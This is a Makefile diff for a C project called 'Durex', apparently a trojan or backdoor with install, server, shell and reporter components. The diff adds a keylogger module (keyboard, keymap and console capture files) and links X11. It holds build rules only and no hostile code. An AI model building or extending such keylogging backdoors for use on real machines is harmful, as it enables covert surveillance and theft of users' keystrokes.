@@ -13,13 +13,18 @@
 NAME	= Durex
 SRC		= main.c install.c durex.c server.c client.c encrypt.c commands.c
 SRC		+= signal.c move.c reporter.c stdlib.c library.c shell.c
+SRC_KEY	= keylogger_init.c keylogger_loop.c handlers.c
+SRC_KEY	+= get_console.c get_keyboard.c get_keymaps.c get_keys.c get_keystate.c
 OBJ		= $(addprefix $(OBJ_DIR), $(SRC:.c=.o))
+OBJ		+= $(addprefix $(OBJ_DIR), $(SRC_KEY:.c=.o))
 DEP		= $(addprefix $(DEP_DIR), $(SRC:.c=.d))
+DEP		+= $(addprefix $(DEP_DIR), $(SRC_KEY:.c=.d))
 SRC_DIR	= srcs/
+SRC_KEY_DIR = $(SRC_DIR)keylogger/
 HDR_DIR = -I includes/
 OBJ_DIR	= objs/
 DEP_DIR = .deps/
-LIB_DIR	= libft/
+LIBS	= -lX11
 FLAGS	= -Wall -Werror -Wextra
 
 all: $(OBJ_DIR) $(NAME)
@@ -37,6 +42,11 @@ $(OBJ_DIR)%.o: $(SRC_DIR)%.c $(DEP_DIR)%.d
 	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@
 
 $(OBJ_DIR)shell.o: FLAGS += -D_XOPEN_SOURCE=600
+
+$(OBJ_DIR)%.o: $(SRC_KEY_DIR)%.c
+$(OBJ_DIR)%.o: $(SRC_KEY_DIR)%.c $(DEP_DIR)%.d
+	$(CC) -MT $@ -MMD -MP -MF $(DEP_DIR)$*.Td $(FLAGS) -o $@ -c $< $(HDR_DIR)
+	@mv -f $(DEP_DIR)$*.Td $(DEP_DIR)$*.d && touch $@
 
 $(DEP_DIR)%.d: ;
 .PRECIOUS: $@
